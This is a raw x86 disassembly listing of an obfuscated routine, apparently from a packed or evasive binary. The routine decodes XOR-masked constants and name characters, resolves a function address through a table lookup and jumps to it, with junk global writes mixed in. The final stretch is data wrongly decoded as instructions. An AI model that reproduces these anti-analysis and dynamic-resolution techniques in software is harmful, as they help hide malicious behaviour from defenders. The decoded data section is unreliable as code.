  4217a5:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217af:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217b9:	mov    eax,DWORD PTR [ebp-0xf8]
  4217bf:	mov    ecx,DWORD PTR [ebp-0x130]
  4217c5:	xor    edx,edx
  4217c7:	div    ecx
  4217c9:	add    eax,0x454e
  4217ce:	mov    ecx,DWORD PTR [ebp-0xc]
  4217d1:	and    eax,ecx
  4217d3:	xor    eax,0x5940
  4217d8:	add    eax,DWORD PTR [ebp+0x8]
  4217db:	mov    ecx,DWORD PTR [ebp-0x110]
  4217e1:	mov    edx,DWORD PTR [ebp-0xa4]
  4217e7:	sub    ecx,edx
  4217e9:	mov    edx,DWORD PTR [ebp-0xd4]
  4217ef:	or     ecx,edx
  4217f1:	mov    edx,DWORD PTR [ebp-0x8]
  4217f4:	and    ecx,edx
  4217f6:	mov    edx,DWORD PTR [ebp-0x20]
  4217f9:	xor    ecx,edx
  4217fb:	mov    edx,DWORD PTR [ebp-0x10c]
  421801:	mov    esi,0x180f
  421806:	sub    esi,edx
  421808:	mov    edx,DWORD PTR [ebp-0xa0]
  42180e:	imul   esi,edx
  421811:	xor    esi,0x402b
  421817:	xor    esi,0xfed78c17
  42181d:	mov    edx,DWORD PTR [ebp-0xe8]
  421823:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  42182a:	add    ecx,eax
  42182c:	add    esi,ecx
  42182e:	mov    DWORD PTR [ebp-0x38],esi
  421831:	mov    DWORD PTR [ebp-0x4],0x59a8
  421838:	mov    DWORD PTR [ebp-0x30],0x7021
  42183f:	mov    DWORD PTR [ebp-0xf4],0x6210
  421849:	mov    DWORD PTR [ebp-0x58],0x73d5
  421850:	mov    DWORD PTR [ebp-0x124],0x1e7d
  42185a:	mov    DWORD PTR [ebp-0x3c],0x3144
  421861:	mov    eax,DWORD PTR [ebp-0x30]
  421864:	xor    eax,0x75cb
  421869:	mov    ecx,DWORD PTR [ebp-0x4]
  42186c:	imul   eax,ecx
  42186f:	mov    ecx,DWORD PTR [ebp+0x8]
  421872:	lea    ecx,[ecx+eax*1-0x2123b90]
  421879:	mov    eax,DWORD PTR [ebp-0xf4]
  42187f:	and    eax,0x6b34
  421884:	and    eax,0x658d
  421889:	xor    edx,edx
  42188b:	push   0x6
  42188d:	pop    esi
  42188e:	div    esi
  421890:	imul   eax,eax,0x3fb9
  421896:	mov    edx,DWORD PTR [ebp-0x3c]
  421899:	and    edx,0x58c7
  42189f:	mov    esi,DWORD PTR [ebp-0x124]
  4218a5:	or     edx,esi
  4218a7:	add    edx,0x7a25
  4218ad:	imul   edx,edx,0x28d2
  4218b3:	mov    esi,DWORD PTR [ebp-0x58]
  4218b6:	xor    edx,esi
  4218b8:	xor    edx,0x1856f731
  4218be:	mov    esi,DWORD PTR [ebp-0xe8]
  4218c4:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218cb:	add    eax,ecx
  4218cd:	add    edx,eax
  4218cf:	mov    DWORD PTR [ebp-0xac],edx
  4218d5:	mov    DWORD PTR [ebp-0x54],0x1
  4218dc:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4218e3:	mov    DWORD PTR [ebp-0x1c],0x64d8
  4218ea:	mov    DWORD PTR [ebp-0xf0],0x5a06
  4218f4:	mov    DWORD PTR [ebp-0x108],0x2eeb
  4218fe:	mov    DWORD PTR [ebp-0x104],0x2108
  421908:	mov    eax,DWORD PTR [ebp-0x1c]
  42190b:	xor    edx,edx
  42190d:	push   0x3
  42190f:	pop    ecx
  421910:	div    ecx
  421912:	mov    ecx,DWORD PTR [ebp-0x40]
  421915:	or     eax,ecx
  421917:	mov    ecx,DWORD PTR [ebp-0x54]
  42191a:	xor    edx,edx
  42191c:	div    ecx
  42191e:	imul   eax,eax,0x7d53
  421924:	mov    ecx,DWORD PTR [ebp+0x8]
  421927:	lea    eax,[ecx+eax*1-0x1f534807]
  42192e:	mov    ecx,DWORD PTR [ebp-0xf0]
  421934:	and    ecx,0x4108
  42193a:	and    ecx,0x40e7
  421940:	sub    ecx,0x1a54
  421946:	xor    ecx,0x25ac
  42194c:	mov    edx,DWORD PTR [ebp-0x104]
  421952:	xor    edx,0x6dda
  421958:	mov    esi,DWORD PTR [ebp-0x108]
  42195e:	and    edx,esi
  421960:	and    edx,0xe0c
  421966:	or     edx,0x5b
  421969:	mov    esi,DWORD PTR [ebp-0xe8]
  42196f:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  421973:	add    ecx,eax
  421975:	lea    eax,[edx+ecx*1-0xc5b]
  42197c:	mov    DWORD PTR [ebp-0xa8],eax
  421982:	and    DWORD PTR [ebp-0x144],0x0
  421989:	jmp    0x42199b
  42198e:	mov    eax,DWORD PTR [ebp-0x144]
  421994:	inc    eax
  421995:	mov    DWORD PTR [ebp-0x144],eax
  42199b:	mov    eax,DWORD PTR [ebp-0xe8]
  4219a1:	mov    ecx,DWORD PTR [ebp-0x144]
  4219a7:	cmp    ecx,DWORD PTR [eax+0x18]
  4219aa:	je     0x421f63
  4219b0:	mov    eax,DWORD PTR [ebp-0x144]
  4219b6:	mov    ecx,DWORD PTR [ebp-0x38]
  4219b9:	mov    edx,DWORD PTR [ebp+0x8]
  4219bc:	add    edx,DWORD PTR [ecx+eax*4]
  4219bf:	mov    DWORD PTR [ebp-0x48],edx
  4219c2:	mov    eax,DWORD PTR [ebp-0x48]
  4219c5:	mov    DWORD PTR [ebp-0x210],eax
  4219cb:	mov    eax,DWORD PTR [ebp+0xc]
  4219ce:	mov    DWORD PTR [ebp-0x20c],eax
  4219d4:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  4219de:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  4219e8:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  4219f2:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  4219fc:	lea    eax,[ebp-0x1e8]
  421a02:	mov    DWORD PTR [ebp-0x1f4],eax
  421a08:	mov    eax,DWORD PTR [ebp-0x20c]
  421a0e:	movzx  eax,WORD PTR [eax+0x20]
  421a12:	xor    eax,0xa49b
  421a17:	movzx  eax,ax
  421a1a:	sar    eax,1
  421a1c:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a22:	movzx  ecx,WORD PTR [ecx+0x20]
  421a26:	xor    ecx,0xa49b
  421a2c:	movzx  ecx,cx
  421a2f:	shl    ecx,0xf
  421a32:	or     eax,ecx
  421a34:	movzx  eax,ax
  421a37:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a3d:	mov    DWORD PTR [ecx],eax
  421a3f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a45:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a4b:	xor    eax,0xca79a575
  421a50:	xor    edx,0x9c1b89e8
  421a56:	mov    cl,0x2
  421a58:	call   0x40a9b5
  421a5d:	mov    ebx,eax
  421a5f:	mov    esi,edx
  421a61:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a67:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a6d:	xor    eax,0xca79a575
  421a72:	xor    edx,0x9c1b89e8
  421a78:	mov    cl,0x3e
  421a7a:	call   0x4221f7
  421a7f:	or     ebx,eax
  421a81:	or     esi,edx
  421a83:	movzx  eax,bl
  421a86:	push   eax
  421a87:	lea    eax,[ebp-0x198]
  421a8d:	push   eax
  421a8e:	call   0x416c9e
  421a93:	mov    eax,DWORD PTR [ebp-0x1f0]
  421a99:	mov    edx,DWORD PTR [ebp-0x1ec]
  421a9f:	xor    eax,0xca79a575
  421aa4:	xor    edx,0x9c1b89e8
  421aaa:	mov    cl,0x2
  421aac:	call   0x40a9b5
  421ab1:	mov    esi,eax
  421ab3:	mov    edi,edx
  421ab5:	mov    eax,DWORD PTR [ebp-0x1f0]
  421abb:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ac1:	xor    eax,0xca79a575
  421ac6:	xor    edx,0x9c1b89e8
  421acc:	mov    cl,0x3e
  421ace:	call   0x4221f7
  421ad3:	or     esi,eax
  421ad5:	or     edi,edx
  421ad7:	mov    DWORD PTR [ebp-0x1f8],esi
  421add:	jmp    0x421b32
  421ae2:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ae8:	mov    edx,DWORD PTR [ebp-0x1dc]
  421aee:	xor    eax,0xca79a575
  421af3:	xor    edx,0x9c1b89e8
  421af9:	mov    cl,0x2
  421afb:	call   0x40a9b5
  421b00:	mov    esi,eax
  421b02:	mov    edi,edx
  421b04:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b0a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b10:	xor    eax,0xca79a575
  421b15:	xor    edx,0x9c1b89e8
  421b1b:	mov    cl,0x3e
  421b1d:	call   0x4221f7
  421b22:	or     esi,eax
  421b24:	or     edi,edx
  421b26:	add    esi,DWORD PTR [ebp-0x1f8]
  421b2c:	mov    DWORD PTR [ebp-0x1f8],esi
  421b32:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b38:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b3e:	je     0x421bd1
  421b44:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b4a:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b50:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b55:	xor    eax,0xa49b
  421b5a:	movzx  eax,ax
  421b5d:	sar    eax,1
  421b5f:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b65:	mov    edx,DWORD PTR [ebp-0x20c]
  421b6b:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421b70:	xor    ecx,0xa49b
  421b76:	movzx  ecx,cx
  421b79:	shl    ecx,0xf
  421b7c:	or     eax,ecx
  421b7e:	movzx  eax,ax
  421b81:	mov    DWORD PTR [ebp-0x1fc],eax
  421b87:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b8d:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b93:	movzx  eax,WORD PTR [ecx+eax*4]
  421b97:	xor    eax,0xa49b
  421b9c:	movzx  eax,ax
  421b9f:	sar    eax,1
  421ba1:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ba7:	mov    edx,DWORD PTR [ebp-0x20c]
  421bad:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bb1:	xor    ecx,0xa49b
  421bb7:	movzx  ecx,cx
  421bba:	shl    ecx,0xf
  421bbd:	or     eax,ecx
  421bbf:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421bc5:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421bcc:	jmp    0x421ae2
  421bd1:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bd7:	mov    edx,DWORD PTR [ebp-0x1ec]
  421bdd:	xor    eax,0xca79a575
  421be2:	xor    edx,0x9c1b89e8
  421be8:	mov    cl,0x2
  421bea:	call   0x40a9b5
  421bef:	mov    esi,eax
  421bf1:	mov    edi,edx
  421bf3:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bf9:	mov    edx,DWORD PTR [ebp-0x1ec]
  421bff:	xor    eax,0xca79a575
  421c04:	xor    edx,0x9c1b89e8
  421c0a:	mov    cl,0x3e
  421c0c:	call   0x4221f7
  421c11:	or     esi,eax
  421c13:	or     edi,edx
  421c15:	mov    DWORD PTR [ebp-0x1e4],esi
  421c1b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c21:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c27:	xor    eax,0xca79a575
  421c2c:	xor    edx,0x9c1b89e8
  421c32:	mov    cl,0x2
  421c34:	call   0x40a9b5
  421c39:	mov    esi,eax
  421c3b:	mov    edi,edx
  421c3d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c43:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c49:	xor    eax,0xca79a575
  421c4e:	xor    edx,0x9c1b89e8
  421c54:	mov    cl,0x3e
  421c56:	call   0x4221f7
  421c5b:	or     esi,eax
  421c5d:	or     edi,edx
  421c5f:	mov    DWORD PTR [ebp-0x23c],esi
  421c65:	mov    DWORD PTR [ebp-0x238],edi
  421c6b:	mov    eax,DWORD PTR [ebp-0x23c]
  421c71:	or     eax,DWORD PTR [ebp-0x238]
  421c77:	je     0x421ed7
  421c7d:	lea    eax,[ebp-0x204]
  421c83:	mov    DWORD PTR [ebp-0x208],eax
  421c89:	mov    eax,DWORD PTR [ebp-0x1e4]
  421c8f:	xor    edx,edx
  421c91:	mov    cl,0x2
  421c93:	call   0x4221f7
  421c98:	mov    esi,eax
  421c9a:	mov    edi,edx
  421c9c:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ca2:	xor    edx,edx
  421ca4:	mov    cl,0x3e
  421ca6:	call   0x40a9b5
  421cab:	or     esi,eax
  421cad:	or     edi,edx
  421caf:	xor    esi,0xca79a575
  421cb5:	xor    edi,0x9c1b89e8
  421cbb:	mov    eax,DWORD PTR [ebp-0x208]
  421cc1:	mov    DWORD PTR [eax],esi
  421cc3:	mov    DWORD PTR [eax+0x4],edi
  421cc6:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ccc:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421cd4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cda:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ce0:	xor    eax,0xca79a575
  421ce5:	xor    edx,0x9c1b89e8
  421ceb:	mov    cl,0x2
  421ced:	call   0x40a9b5
  421cf2:	mov    ebx,eax
  421cf4:	mov    edi,edx
  421cf6:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cfc:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d02:	xor    eax,0xca79a575
  421d07:	xor    edx,0x9c1b89e8
  421d0d:	mov    cl,0x3e
  421d0f:	call   0x4221f7
  421d14:	or     ebx,eax
  421d16:	or     edi,edx
  421d18:	movsx  eax,bl
  421d1b:	cmp    esi,eax
  421d1d:	je     0x421e7d
  421d23:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d29:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d31:	mov    eax,DWORD PTR [ebp-0x204]
  421d37:	mov    edx,DWORD PTR [ebp-0x200]
  421d3d:	xor    eax,0xca79a575
  421d42:	xor    edx,0x9c1b89e8
  421d48:	mov    cl,0x2
  421d4a:	call   0x40a9b5
  421d4f:	mov    edi,eax
  421d51:	mov    ebx,edx
  421d53:	mov    eax,DWORD PTR [ebp-0x204]
  421d59:	mov    edx,DWORD PTR [ebp-0x200]
  421d5f:	xor    eax,0xca79a575
  421d64:	xor    edx,0x9c1b89e8
  421d6a:	mov    cl,0x3e
  421d6c:	call   0x4221f7
  421d71:	or     edi,eax
  421d73:	or     ebx,edx
  421d75:	mov    eax,DWORD PTR [ebp-0x210]
  421d7b:	movsx  eax,BYTE PTR [eax+edi*1]
  421d7f:	cmp    esi,eax
  421d81:	je     0x421d91
  421d87:	jmp    0x421ed7
  421d8c:	jmp    0x421e7d
  421d91:	mov    eax,DWORD PTR [ebp-0x204]
  421d97:	mov    edx,DWORD PTR [ebp-0x200]
  421d9d:	xor    eax,0xca79a575
  421da2:	xor    edx,0x9c1b89e8
  421da8:	mov    cl,0x2
  421daa:	call   0x40a9b5
  421daf:	mov    esi,eax
  421db1:	mov    edi,edx
  421db3:	mov    eax,DWORD PTR [ebp-0x204]
  421db9:	mov    edx,DWORD PTR [ebp-0x200]
  421dbf:	xor    eax,0xca79a575
  421dc4:	xor    edx,0x9c1b89e8
  421dca:	mov    cl,0x3e
  421dcc:	call   0x4221f7
  421dd1:	or     esi,eax
  421dd3:	or     edi,edx
  421dd5:	mov    eax,DWORD PTR [ebp-0x210]
  421ddb:	movsx  esi,BYTE PTR [eax+esi*1]
  421ddf:	mov    eax,DWORD PTR [ebp-0x1f0]
  421de5:	mov    edx,DWORD PTR [ebp-0x1ec]
  421deb:	xor    eax,0xca79a575
  421df0:	xor    edx,0x9c1b89e8
  421df6:	mov    cl,0x2
  421df8:	call   0x40a9b5
  421dfd:	mov    ebx,eax
  421dff:	mov    edi,edx
  421e01:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e07:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e0d:	xor    eax,0xca79a575
  421e12:	xor    edx,0x9c1b89e8
  421e18:	mov    cl,0x3e
  421e1a:	call   0x4221f7
  421e1f:	or     ebx,eax
  421e21:	or     edi,edx
  421e23:	movsx  eax,bl
  421e26:	cmp    esi,eax
  421e28:	jne    0x421e7d
  421e2e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e34:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e3a:	xor    eax,0xca79a575
  421e3f:	xor    edx,0x9c1b89e8
  421e45:	mov    cl,0x2
  421e47:	call   0x40a9b5
  421e4c:	mov    esi,eax
  421e4e:	mov    edi,edx
  421e50:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e56:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e5c:	xor    eax,0xca79a575
  421e61:	xor    edx,0x9c1b89e8
  421e67:	mov    cl,0x3e
  421e69:	call   0x4221f7
  421e6e:	or     esi,eax
  421e70:	or     edi,edx
  421e72:	mov    DWORD PTR [ebp-0x214],esi
  421e78:	jmp    0x421f21
  421e7d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e83:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e89:	xor    eax,0xca79a575
  421e8e:	xor    edx,0x9c1b89e8
  421e94:	mov    cl,0x2
  421e96:	call   0x40a9b5
  421e9b:	mov    esi,eax
  421e9d:	mov    edi,edx
  421e9f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ea5:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eab:	xor    eax,0xca79a575
  421eb0:	xor    edx,0x9c1b89e8
  421eb6:	mov    cl,0x3e
  421eb8:	call   0x4221f7
  421ebd:	or     esi,eax
  421ebf:	or     edi,edx
  421ec1:	add    esi,DWORD PTR [ebp-0x1e4]
  421ec7:	mov    DWORD PTR [ebp-0x1e4],esi
  421ecd:	jmp    0x421c1b
  421ed2:	jmp    0x421c1b
  421ed7:	mov    eax,DWORD PTR [ebp-0x1f0]
  421edd:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ee3:	xor    eax,0xca79a575
  421ee8:	xor    edx,0x9c1b89e8
  421eee:	mov    cl,0x2
  421ef0:	call   0x40a9b5
  421ef5:	mov    esi,eax
  421ef7:	mov    edi,edx
  421ef9:	mov    eax,DWORD PTR [ebp-0x1f0]
  421eff:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f05:	xor    eax,0xca79a575
  421f0a:	xor    edx,0x9c1b89e8
  421f10:	mov    cl,0x3e
  421f12:	call   0x4221f7
  421f17:	or     esi,eax
  421f19:	or     edi,edx
  421f1b:	mov    DWORD PTR [ebp-0x214],esi
  421f21:	mov    eax,DWORD PTR [ebp-0x214]
  421f27:	mov    DWORD PTR [ebp-0xc8],eax
  421f2d:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f34:	je     0x421f5e
  421f3a:	mov    eax,DWORD PTR [ebp-0x144]
  421f40:	mov    ecx,DWORD PTR [ebp-0xac]
  421f46:	movzx  eax,WORD PTR [ecx+eax*2]
  421f4a:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f50:	mov    eax,DWORD PTR [ecx+eax*4]
  421f53:	mov    DWORD PTR [ebp-0xfc],eax
  421f59:	jmp    0x421f63
  421f5e:	jmp    0x42198e
  421f63:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f6a:	jne    0x421f77
  421f70:	xor    eax,eax
  421f72:	jmp    0x4221f0
  421f77:	mov    eax,DWORD PTR [ebp+0x8]
  421f7a:	add    eax,DWORD PTR [ebp-0xfc]
  421f80:	mov    DWORD PTR [ebp-0xec],eax
  421f86:	mov    DWORD PTR [ebp-0x74],0x0
  421f8d:	cmp    DWORD PTR [ebp-0xb0],0x0
  421f94:	je     0x422010
  421f9a:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fa1:	je     0x422010
  421fa7:	mov    eax,DWORD PTR [ebp-0xb0]
  421fad:	shl    eax,0x2
  421fb0:	mov    DWORD PTR [ebp-0x74],eax
  421fb3:	mov    DWORD PTR [ebp-0x14c],0x0
  421fbd:	sub    esp,DWORD PTR [ebp-0x74]
  421fc0:	mov    DWORD PTR [ebp-0x14c],esp
  421fc6:	mov    DWORD PTR [ebp-0x148],0x0
  421fd0:	mov    eax,DWORD PTR [ebp-0x148]
  421fd6:	cmp    eax,DWORD PTR [ebp-0xb0]
  421fdc:	je     0x422010
  421fe2:	mov    eax,DWORD PTR [ebp-0x148]
  421fe8:	mov    ecx,DWORD PTR [ebp-0x14c]
  421fee:	mov    edx,DWORD PTR [ebp-0x148]
  421ff4:	mov    esi,DWORD PTR [ebp+0x14]
  421ff7:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421ffb:	mov    DWORD PTR [ecx+eax*4],edx
  421ffe:	mov    eax,DWORD PTR [ebp-0x148]
  422004:	inc    eax
  422005:	mov    DWORD PTR [ebp-0x148],eax
  42200b:	jmp    0x421fd0
  422010:	mov    DWORD PTR [ebp-0x9c],0x0
  42201a:	push   0x4221a9
  42201f:	jmp    DWORD PTR [ebp-0xec]
  422025:	mov    eax,eax
  422027:	mov    ecx,esp
  422029:	ret    0xc
  42202c:	cmp    DWORD PTR ds:0x4282bf,0x0
  422033:	mov    DWORD PTR ds:0x4282bb,0x7476
  42203d:	mov    DWORD PTR ds:0x428137,0x1cdc
  422047:	mov    DWORD PTR ds:0x4282bb,0x65fa
  422051:	mov    DWORD PTR ds:0x428127,0x5dca
  42205b:	jmp    0x4220a5
  422060:	mov    eax,ds:0x4282b7
  422065:	cmp    DWORD PTR ds:0x4282bf,0x0
  42206c:	jbe    0x42208d
  422072:	push   0x24f1
  422077:	call   DWORD PTR ds:0x428d38
  42207d:	inc    DWORD PTR ds:0x428363
  422083:	sub    DWORD PTR ds:0x428143,0x46d9
  42208d:	inc    DWORD PTR ds:0x4282bf
  422093:	adc    DWORD PTR ds:0x4282cb,ebx
  422099:	or     DWORD PTR ds:0x4281f3,0x4029
  4220a3:	not    eax
  4220a5:	push   ebx
  4220a6:	push   esi
  4220a7:	sbb    DWORD PTR ds:0x42834f,edx
  4220ad:	mov    eax,DWORD PTR [esp+0x18]
  4220b1:	or     eax,eax
  4220b3:	jne    0x4220e3
  4220b9:	mov    ecx,DWORD PTR [esp+0x14]
  4220bd:	mov    eax,DWORD PTR [esp+0x10]
  4220c1:	xor    edx,edx
  4220c3:	div    ecx
  4220c5:	xor    DWORD PTR ds:0x42814f,0x45f1
  4220cf:	mov    ebx,eax
  4220d1:	mov    eax,DWORD PTR [esp+0xc]
  4220d5:	div    ecx
  4220d7:	mov    edx,0x36e3
  4220dc:	mov    edx,ebx
  4220de:	jmp    0x4221a4
  4220e3:	mov    ecx,eax
  4220e5:	sbb    eax,0x67a9
  4220ea:	mov    ebx,DWORD PTR [esp+0x14]
  4220ee:	cmp    DWORD PTR ds:0x4282b7,0x0
  4220f5:	mov    edx,DWORD PTR ds:0x428367
  4220fb:	mov    DWORD PTR ds:0x4282e7,0x4bc7
  422105:	mov    edx,DWORD PTR ds:0x4282cf
  42210b:	jmp    0x422155
  422110:	mov    DWORD PTR ds:0x428217,0x15f
  42211a:	mov    DWORD PTR ds:0x42824f,0x4dd1
  422124:	cmp    DWORD PTR ds:0x4282b7,0x0
  42212b:	jle    0x422148
  422131:	push   0x824e
  422136:	call   DWORD PTR ds:0x428d3c
  42213c:	xor    DWORD PTR ds:0x4282cf,0x6c44
  422146:	sub    edx,edx
  422148:	sbb    DWORD PTR ds:0x428217,0x445e
  422152:	dec    edx
  422153:	not    edx
  422155:	mov    edx,DWORD PTR [esp+0x10]
  422159:	mov    eax,DWORD PTR [esp+0xc]
  42215d:	shr    ecx,1
  42215f:	rcr    ebx,1
  422161:	shr    edx,1
  422163:	rcr    eax,1
  422165:	or     ecx,ecx
  422167:	jne    0x42215d
  42216d:	div    ebx
  42216f:	mov    esi,eax
  422171:	mul    DWORD PTR [esp+0x18]
  422175:	mov    ecx,eax
  422177:	mov    eax,DWORD PTR [esp+0x14]
  42217b:	mul    esi
  42217d:	add    edx,ecx
  42217f:	jb     0x42219f
  422185:	cmp    edx,DWORD PTR [esp+0x10]
  422189:	ja     0x42219f
  42218f:	jb     0x4221a0
  422195:	cmp    eax,DWORD PTR [esp+0xc]
  422199:	jbe    0x4221a0
  42219f:	dec    esi
  4221a0:	xor    edx,edx
  4221a2:	mov    eax,esi
  4221a4:	pop    esi
  4221a5:	pop    ebx
  4221a6:	ret    0x10
  4221a9:	or     DWORD PTR ds:0x428333,0x42833f
  4221b3:	sub    DWORD PTR [ebp+0x10],0x1
  4221b7:	mov    DWORD PTR ds:0x42813b,0x43bf
  4221c1:	cmp    DWORD PTR [ebp+0x10],0x0
  4221c5:	mov    DWORD PTR ds:0x42832b,0x612a
  4221cf:	je     0x4221de
  4221d5:	xor    DWORD PTR ds:0x428127,edx
  4221db:	add    esp,DWORD PTR [ebp-0x74]
  4221de:	mov    DWORD PTR [ebp-0x9c],eax
  4221e4:	mov    DWORD PTR ds:0x42822f,ebx
  4221ea:	mov    eax,DWORD PTR [ebp-0x9c]
  4221f0:	pop    edi
  4221f1:	pop    esi
  4221f2:	pop    ebx
  4221f3:	leave  
  4221f4:	ret    0x10
  4221f7:	cmp    cl,0x40
  4221fa:	mov    DWORD PTR ds:0x428213,0x43a8
  422204:	jae    0x422256
  42220a:	mov    DWORD PTR ds:0x428147,0x42f2
  422214:	cmp    cl,0x20
  422217:	mov    DWORD PTR ds:0x42812f,0x3d58
  422221:	jae    0x422241
  422227:	or     DWORD PTR ds:0x428123,0x5e1e
  422231:	shld   edx,eax,cl
  422234:	mov    DWORD PTR ds:0x428247,0x1bd2
  42223e:	shl    eax,cl
  422240:	ret    
  422241:	inc    edx
  422242:	mov    edx,eax
  422244:	sub    DWORD PTR ds:0x428363,0x4282bb
  42224e:	xor    eax,eax
  422250:	and    cl,0x1f
  422253:	shl    edx,cl
  422255:	ret    
  422256:	xor    eax,eax
  422258:	xor    edx,edx
  42225a:	ret    
  42225b:	add    BYTE PTR [eax],al
  42225d:	add    BYTE PTR [eax],al
  42225f:	add    cl,ch
  422261:	cmp    ebp,DWORD PTR [ebx+0x14]
  422264:	cmp    al,0x26
  422266:	sub    al,0x44
  422268:	jno    0x4222d3
  42226a:	ja     0x4222d1
  42226c:	int3   
  42226d:	fsubr  QWORD PTR [edx+0x1e]
  422270:	jo     0x4222d7
  422272:	popa   
  422273:	ins    BYTE PTR es:[edi],dx
  422274:	push   eax
  422275:	lods   eax,DWORD PTR ds:[esi]
  422276:	xor    DWORD PTR [esi+0x41],edi
  422279:	ins    BYTE PTR es:[edi],dx
  42227a:	popa   
  42227b:	outs   dx,BYTE PTR ds:[esi]
  42227c:	add    BYTE PTR [eax],al
  42227e:	add    BYTE PTR [eax],al
  422280:	addr16 jb 0x4222e8
  422283:	popa   
  422284:	je     0x4222ed
  422286:	jb     0x4222ed
  422288:	popa   
  422289:	je     0x4222f2
  42228b:	jb     0x4222f2
  42228d:	popa   
  42228e:	je     0x4222f7
  422290:	jb     0x4222f7
  422292:	popa   
  422293:	je     0x4222fc
  422295:	jb     0x4222fc
  422297:	popa   
  422298:	je     0x422301
  42229a:	jb     0x422301
  42229c:	popa   
  42229d:	je     0x422306
  42229f:	jb     0x422306
  4222a1:	popa   
  4222a2:	je     0x42230b
  4222a4:	jb     0x42230b
  4222a6:	popa   
  4222a7:	je     0x422310
  4222a9:	jb     0x422310
  4222ab:	popa   
  4222ac:	je     0x422315
  4222ae:	jb     0x422315
  4222b0:	popa   
  4222b1:	je     0x4222b3
  4222b3:	add    BYTE PTR [eax+0x65],ch
  4222b6:	ins    BYTE PTR es:[edi],dx
  4222b7:	ins    BYTE PTR es:[edi],dx
  4222b8:	push   0x686c6c65
  4222bd:	gs ins BYTE PTR es:[edi],dx
  4222bf:	ins    BYTE PTR es:[edi],dx
  4222c0:	push   0x686c6c65
  4222c5:	gs ins BYTE PTR es:[edi],dx
  4222c7:	ins    BYTE PTR es:[edi],dx
  4222c8:	push   0x686c6c65
  4222cd:	gs ins BYTE PTR es:[edi],dx
  4222cf:	ins    BYTE PTR es:[edi],dx
  4222d0:	push   0x686c6c65
  4222d5:	gs ins BYTE PTR es:[edi],dx
  4222d7:	ins    BYTE PTR es:[edi],dx
  4222d8:	push   0x686c6c65
  4222dd:	gs ins BYTE PTR es:[edi],dx
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	push   0x686c6c65
  4222e5:	gs ins BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	add    BYTE PTR [eax],al
  4222ea:	add    BYTE PTR [eax],al
  4222ec:	outs   dx,DWORD PTR ds:[esi]
  4222ed:	add    BYTE PTR [eax+eax*1+0x65],ch
  4222f1:	add    BYTE PTR [ecx+0x0],ah
  4222f4:	jne    0x4222f6
  4222f6:	je     0x4222f8
  4222f8:	xor    eax,DWORD PTR [eax]
  4222fa:	xor    al,BYTE PTR [eax]
  4222fc:	add    BYTE PTR [eax],al
  4222fe:	add    BYTE PTR [eax],al
  422300:	push   0x61006500
  422305:	add    BYTE PTR [esi+0x0],dh
  422308:	add    BYTE PTR gs:[esi+0x0],ch
  42230c:	push   0x61006500
  422311:	add    BYTE PTR [esi+0x0],dh
  422314:	add    BYTE PTR gs:[esi+0x0],ch
  422318:	push   0x61006500
  42231d:	add    BYTE PTR [esi+0x0],dh
  422320:	add    BYTE PTR gs:[esi+0x0],ch
  422324:	push   0x61006500
